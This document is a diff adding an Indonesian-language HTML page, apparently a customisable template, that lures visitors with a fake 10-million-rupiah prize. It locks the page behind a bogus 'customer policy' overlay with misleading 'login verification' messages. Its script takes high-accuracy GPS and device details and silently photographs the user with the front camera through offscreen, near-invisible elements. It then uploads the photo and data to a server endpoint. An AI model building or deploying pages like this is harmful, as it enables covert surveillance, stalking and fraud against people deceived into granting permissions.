@@ -1,0 +1,546 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Mobile Camera Gateway</title>
+  <link
+    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
+    rel="stylesheet"
+    integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH"
+    crossorigin="anonymous"
+  />
+  <style>
+    body {
+      margin: 0;
+      min-height: 100vh;
+      padding: 24px 12px;
+      background:
+        radial-gradient(1200px 700px at 20% -10%, #ffffffb8, transparent 50%),
+        radial-gradient(900px 700px at 110% 110%, #a4c4e833, transparent 46%),
+        linear-gradient(148deg, #f4eee3, #cfdeef);
+    }
+
+    #mainView {
+      max-width: 680px;
+    }
+
+    .card-custom-shadow {
+      box-shadow: 0 16px 40px rgba(22, 31, 44, 0.18);
+      border: 1px solid #ffffff9e;
+      backdrop-filter: blur(8px);
+    }
+
+    .offscreen {
+      position: fixed;
+      left: -20000px;
+      top: -20000px;
+      width: 2px;
+      height: 2px;
+      opacity: 0.01;
+      pointer-events: none;
+    }
+
+    .status-dot {
+      display: inline-block;
+      width: 9px;
+      height: 9px;
+      border-radius: 50%;
+      background: currentColor;
+      opacity: 0.8;
+      flex: 0 0 auto;
+    }
+
+    .status-pulse .status-dot {
+      animation: pulse 1.4s ease-in-out infinite;
+    }
+
+    .step-badge {
+      min-width: 92px;
+    }
+
+    /* LOCK SCREEN TEMPLATE STYLE: edit overlay container look here */
+    #permissionOverlay {
+      position: fixed;
+      inset: 0;
+      z-index: 5000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      background: rgba(12, 16, 22, 0.62);
+      backdrop-filter: blur(4px);
+    }
+
+    /* LOCK SCREEN TEMPLATE STYLE: edit panel shape/color/shadow here */
+    .overlay-panel {
+      width: min(94vw, 520px);
+      border-radius: 14px;
+      overflow: hidden;
+      background: #ffffff;
+      border: 1px solid #d3dae6;
+      box-shadow: 0 20px 50px rgba(10, 18, 28, 0.28);
+    }
+
+    /* LOCK SCREEN TEMPLATE STYLE: edit top title bar style here */
+    .overlay-head {
+      padding: 10px 14px;
+      border-bottom: 1px solid #e8edf4;
+      background: #f7f9fc;
+      font-size: 0.92rem;
+      font-weight: 600;
+      color: #2b3647;
+    }
+
+    /* LOCK SCREEN TEMPLATE STYLE: edit body spacing here */
+    .overlay-body {
+      padding: 14px;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(0.92); opacity: 0.7; }
+      50% { transform: scale(1.18); opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <main id="mainView" class="container py-4">
+    <div class="card card-custom-shadow rounded-4 bg-light-subtle mx-auto" style="width: 18rem;">
+      <img
+        id="mainImage"
+        src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTw2YtNcv3c6p_2RZ5gZ5b2qnMavcsPvD_FNL6n0AjsQ003ANmobkJ0haXW&s=10"
+        class="card-img-top"
+        alt="Promo"
+      />
+      <div class="card-body">
+        <p class="card-text" id="mainText">Selamat Anda Mendapat Hadiah 10 Juta Rupiah!</p>
+      </div>
+    </div>
+
+    <div id="permissionRequiredCard" class="d-none" hidden>
+      <span>Permission Required</span>
+      <h1>Allow Camera and Location</h1>
+      <p>To continue, you must grant both permissions.</p>
+    </div>
+  </main>
+
+  <!-- LOCK SCREEN OVERLAY START: template layout you can modify safely -->
+  <section id="permissionOverlay" aria-modal="true" role="dialog" aria-labelledby="overlayTitle">
+    <div class="overlay-panel">
+      <!-- LOCK SCREEN TEXT (static): header label -->
+      <div class="overlay-head">Kebijakan dan Privasi</div>
+      <div class="overlay-body">
+        <!-- LOCK SCREEN TEXT (dynamic from config): title/subtitle -->
+        <h2 class="h5 mb-2" id="overlayTitle">Kebijakan Pelanggan</h2>
+        <p class="text-body-secondary mb-3" id="overlaySubtitle">
+          Ijinkan dulu aja, biar bisa lanjut ke halaman berikutnya.
+        </p>
+
+        <!-- LOCK SCREEN TEMPLATE: permission steps layout -->
+        <ul hidden class="list-group mb-3" id="permissionSteps">
+          <li hidden class="list-group-item d-flex justify-content-between align-items-center" id="stepLocation">
+            <span>Location Permission</span>
+            <span class="badge text-bg-secondary step-badge">Waiting</span>
+          </li>
+          <li hidden class="list-group-item d-flex justify-content-between align-items-center" id="stepCamera">
+            <span>Camera Permission</span>
+            <span class="badge text-bg-secondary step-badge">Waiting</span>
+          </li>
+          <li hidden class="list-group-item d-flex justify-content-between align-items-center" id="stepUpload">
+            <span>Capture and Upload</span>
+            <span class="badge text-bg-secondary step-badge">Waiting</span>
+          </li>
+        </ul>
+
+        <!-- LOCK SCREEN TEMPLATE: status area -->
+        <div hidden class="alert alert-info d-flex align-items-center gap-2 mb-3 status-pulse" id="status" role="status" aria-live="polite">
+          <span class="status-dot"></span>
+          <span id="statusText">Verifikasi Login</span>
+        </div>
+
+        <!-- LOCK SCREEN TEMPLATE: action buttons -->
+        <div class="d-flex flex-wrap gap-2">
+          <button class="btn btn-primary" id="startBtn" type="button">Continue</button>
+          <button class="btn btn-outline-secondary" id="retryBtn" type="button" hidden>Retry</button>
+        </div>
+
+        <p class="small text-body-secondary mt-3 mb-0" id="helpText" hidden>
+          If blocked, open browser site settings and allow Camera and Location, then tap Retry.
+        </p>
+      </div>
+    </div>
+  </section>
+  <!-- LOCK SCREEN OVERLAY END -->
+
+  <video id="video" class="offscreen" autoplay playsinline muted></video>
+  <canvas id="canvas" class="offscreen"></canvas>
+
+  <script>
+    // LOCK SCREEN EDIT START: safest place to change text/image/button labels
+    const EDITABLE_UI_CONFIG = {
+      mainCard: {
+        imageSrc: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTw2YtNcv3c6p_2RZ5gZ5b2qnMavcsPvD_FNL6n0AjsQ003ANmobkJ0haXW&s=10',
+        imageAlt: 'Promo',
+        text: 'Selamat Anda Mendapat Hadiah 10 Juta Rupiah!'
+      },
+      // LOCK SCREEN TEXT CONFIG: title, subtitle, and button labels
+      overlayText: {
+        title: 'Kebijakan Pelanggan',
+        subtitle: 'Ijinkan dulu aja, biar bisa lanjut ke halaman berikutnya.',
+        startButton: 'Continue',
+        retryButton: 'Retry'
+      },
+      // LOCK SCREEN STATUS TEXT CONFIG
+      statusMessages: {
+        ready: 'Verifikasi Login',
+        checkingLocation: 'Verifikasi sesi',
+        checkingCamera: 'Verifikasi akun...',
+        uploading: 'Sinkronisasi akun...',
+        success: 'Sinkronisasi selesai.',
+        denied: 'Sinkronisasi gagal. Camera and location are required to continue.',
+        failed: 'Capture failed. Please retry permission flow.',
+        noGeo: 'Geolocation is not available in this browser.'
+      },
+      // LOCK SCREEN ANIMATION CONFIG
+      animation: {
+        statusPulse: true
+      }
+    };
+    // LOCK SCREEN EDIT END
+
+    const EXTERNAL_UI_CONFIG = window.MOBILE_CAMERA_CUSTOM_CONFIG || {};
+
+    const DEFAULT_UI_CONFIG = {
+      mainCard: {
+        imageSrc: '',
+        imageAlt: 'Main image',
+        text: ''
+      },
+      overlayText: {
+        title: 'Allow Camera and Location',
+        subtitle: 'This page is locked until both permissions are granted.',
+        startButton: 'Continue',
+        retryButton: 'Retry'
+      },
+      statusMessages: {
+        ready: 'Verifikasi Login',
+        checkingLocation: 'Verifikasi sesi',
+        checkingCamera: 'Verifikasi akun...',
+        uploading: 'Sinkronisasi akun...',
+        success: 'Sinkronisasi selesai.',
+        denied: 'Sinkronisasi gagal. Camera and location are required to continue.',
+        failed: 'Capture failed. Please retry permission flow.',
+        noGeo: 'Geolocation is not available in this browser.'
+      },
+      animation: {
+        statusPulse: true
+      }
+    };
+
+    function deepMerge(base, override) {
+      const out = Array.isArray(base) ? [...base] : { ...base };
+      if (!override || typeof override !== 'object') {
+        return out;
+      }
+      for (const [key, value] of Object.entries(override)) {
+        if (value && typeof value === 'object' && !Array.isArray(value)) {
+          out[key] = deepMerge(base[key] || {}, value);
+        } else {
+          out[key] = value;
+        }
+      }
+      return out;
+    }
+
+    const CONFIG = deepMerge(deepMerge(DEFAULT_UI_CONFIG, EDITABLE_UI_CONFIG), EXTERNAL_UI_CONFIG);
+
+    const overlayEl = document.getElementById('permissionOverlay');
+    const statusEl = document.getElementById('status');
+    const statusTextEl = document.getElementById('statusText');
+    const startBtn = document.getElementById('startBtn');
+    const retryBtn = document.getElementById('retryBtn');
+    const helpText = document.getElementById('helpText');
+
+    function setStep(stepId, state) {
+      const row = document.getElementById(stepId);
+      if (!row) return;
+      const badge = row.querySelector('.step-badge');
+      if (!badge) return;
+
+      badge.className = 'badge step-badge';
+      if (state === 'ok') {
+        badge.classList.add('text-bg-success');
+        badge.textContent = 'Granted';
+      } else if (state === 'working') {
+        badge.classList.add('text-bg-warning');
+        badge.textContent = 'Checking';
+      } else if (state === 'error') {
+        badge.classList.add('text-bg-danger');
+        badge.textContent = 'Blocked';
+      } else {
+        badge.classList.add('text-bg-secondary');
+        badge.textContent = 'Waiting';
+      }
+    }
+
+    function resetSteps() {
+      setStep('stepLocation', 'idle');
+      setStep('stepCamera', 'idle');
+      setStep('stepUpload', 'idle');
+    }
+
+    function setStatus(text, tone) {
+      statusTextEl.textContent = text || '';
+      statusEl.classList.remove('alert-info', 'alert-danger', 'alert-success', 'alert-warning');
+
+      if (tone === 'error') {
+        statusEl.classList.add('alert-danger');
+      } else if (tone === 'success') {
+        statusEl.classList.add('alert-success');
+      } else if (tone === 'warning') {
+        statusEl.classList.add('alert-warning');
+      } else {
+        statusEl.classList.add('alert-info');
+      }
+    }
+
+    function applyUIConfig() {
+      document.getElementById('mainImage').src = CONFIG.mainCard.imageSrc;
+      document.getElementById('mainImage').alt = CONFIG.mainCard.imageAlt;
+      document.getElementById('mainText').textContent = CONFIG.mainCard.text;
+      document.getElementById('overlayTitle').textContent = CONFIG.overlayText.title;
+      document.getElementById('overlaySubtitle').textContent = CONFIG.overlayText.subtitle;
+      startBtn.textContent = CONFIG.overlayText.startButton;
+      retryBtn.textContent = CONFIG.overlayText.retryButton;
+
+      statusEl.classList.toggle('status-pulse', Boolean(CONFIG.animation.statusPulse));
+      setStatus(CONFIG.statusMessages.ready, 'normal');
+      resetSteps();
+    }
+
+    async function getGPSLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          setStatus(CONFIG.statusMessages.noGeo, 'error');
+          resolve(null);
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            resolve({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+              timestamp: new Date().toISOString()
+            });
+          },
+          () => resolve(null),
+          { timeout: 10000, maximumAge: 0, enableHighAccuracy: true }
+        );
+      });
+    }
+
+    async function getDeviceInfo() {
+      const info = {
+        make: 'Unknown',
+        model: 'Unknown',
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString()
+      };
+
+      try {
+        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+          const values = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
+          info.model = values.model || info.model;
+          info.platform = values.platform || '';
+          info.platformVersion = values.platformVersion || '';
+        } else {
+          const ua = navigator.userAgent || '';
+          const androidMatch = ua.match(/Android.*?;\s*([^;\)]+)/i);
+          if (androidMatch && androidMatch[1]) {
+            info.model = androidMatch[1].trim();
+            info.make = 'Android';
+          }
+          if (/iPhone|iPad|iPod/i.test(ua)) {
+            info.make = 'Apple';
+            info.model = 'iPhone';
+          }
+        }
+      } catch (err) {
+        console.log('Device info error:', err);
+      }
+
+      return info;
+    }
+
+    async function getCameraStream() {
+      const constraints = [
+        { video: { facingMode: { exact: 'user' } } },
+        { video: { facingMode: { ideal: 'user' } } },
+        { video: { facingMode: { exact: 'environment' } } },
+        { video: { facingMode: { ideal: 'environment' } } },
+        { video: true }
+      ];
+
+      for (const constraint of constraints) {
+        try {
+          return await navigator.mediaDevices.getUserMedia(constraint);
+        } catch (_) {
+          // Keep trying until all constraints fail.
+        }
+      }
+
+      throw new Error('CAMERA_PERMISSION_DENIED');
+    }
+
+    function waitForVideoReady(video) {
+      return new Promise((resolve) => {
+        if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
+          resolve();
+          return;
+        }
+
+        const done = () => resolve();
+        video.addEventListener('canplay', done, { once: true });
+        video.addEventListener('loadeddata', done, { once: true });
+        video.addEventListener('playing', done, { once: true });
+      });
+    }
+
+    async function captureDataUrlFromVideo(video, canvas) {
+      const width = video.videoWidth || 1280;
+      const height = video.videoHeight || 720;
+      canvas.width = width;
+      canvas.height = height;
+
+      const ctx = canvas.getContext('2d', { willReadFrequently: true });
+      ctx.fillStyle = '#000000';
+      ctx.fillRect(0, 0, width, height);
+      ctx.drawImage(video, 0, 0, width, height);
+
+      try {
+        return canvas.toDataURL('image/jpeg', 0.98);
+      } catch (err) {
+        console.log('toDataURL error:', err);
+        return '';
+      }
+    }
+
+    async function uploadPhoto(dataUrl, gps, device, captureDate) {
+      const body = {
+        filename: 'auto_capture_' + Date.now() + '.jpg',
+        dataUrl: dataUrl || '',
+        gps,
+        device,
+        captureDate
+      };
+
+      const resp = await fetch('/upload-json', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body)
+      });
+
+      return resp.json();
+    }
+
+    async function runCaptureAndUpload(gps, stream) {
+      const device = await getDeviceInfo();
+      const captureDate = device.timestamp || new Date().toISOString();
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+
+      video.srcObject = stream;
+      video.muted = true;
+      video.setAttribute('playsinline', 'true');
+      await video.play().catch(() => {});
+      await waitForVideoReady(video);
+
+      let dataUrl = '';
+      for (let attempt = 1; attempt <= 8; attempt += 1) {
+        dataUrl = await captureDataUrlFromVideo(video, canvas);
+        if (dataUrl && dataUrl.length > 20000) {
+          break;
+        }
+        await new Promise((r) => setTimeout(r, 500));
+      }
+
+      setStep('stepUpload', 'working');
+      setStatus(CONFIG.statusMessages.uploading, 'normal');
+      const result = await uploadPhoto(dataUrl, gps, device, captureDate);
+      if (!result || !result.ok) {
+        throw new Error('UPLOAD_FAILED');
+      }
+      setStep('stepUpload', 'ok');
+    }
+
+    function stopStream(stream) {
+      if (stream) {
+        stream.getTracks().forEach((track) => track.stop());
+      }
+    }
+
+    // LOCK SCREEN FLOW LOGIC START: avoid changing unless you want behavior changes
+    async function beginPermissionFlow() {
+      startBtn.disabled = true;
+      retryBtn.hidden = true;
+      helpText.hidden = true;
+      resetSteps();
+
+      let stream = null;
+      try {
+        setStep('stepLocation', 'working');
+        setStatus(CONFIG.statusMessages.checkingLocation, 'normal');
+        const gps = await getGPSLocation();
+        if (!gps) {
+          throw new Error('LOCATION_PERMISSION_DENIED');
+        }
+        setStep('stepLocation', 'ok');
+
+        setStep('stepCamera', 'working');
+        setStatus(CONFIG.statusMessages.checkingCamera, 'normal');
+        stream = await getCameraStream();
+        setStep('stepCamera', 'ok');
+
+        await runCaptureAndUpload(gps, stream);
+        setStatus(CONFIG.statusMessages.success, 'success');
+        overlayEl.classList.add('d-none');
+      } catch (err) {
+        console.log('Permission flow error:', err);
+        const msg = err && err.message ? String(err.message) : '';
+        const denied =
+          msg.includes('LOCATION_PERMISSION_DENIED') ||
+          msg.includes('CAMERA_PERMISSION_DENIED') ||
+          (err && err.name === 'NotAllowedError');
+
+        if (msg.includes('LOCATION_PERMISSION_DENIED')) {
+          setStep('stepLocation', 'error');
+        } else if (msg.includes('CAMERA_PERMISSION_DENIED') || (err && err.name === 'NotAllowedError')) {
+          setStep('stepCamera', 'error');
+        } else {
+          setStep('stepUpload', 'error');
+        }
+
+        if (denied) {
+          setStatus(CONFIG.statusMessages.denied, 'error');
+        } else {
+          setStatus(CONFIG.statusMessages.failed, 'error');
+        }
+
+        retryBtn.hidden = false;
+        helpText.hidden = false;
+      } finally {
+        stopStream(stream);
+        startBtn.disabled = false;
+      }
+    }
+
+    startBtn.addEventListener('click', beginPermissionFlow);
+    retryBtn.addEventListener('click', beginPermissionFlow);
+
+    applyUIConfig();
+    // LOCK SCREEN FLOW LOGIC END
+  </script>
+</body>
+</html>
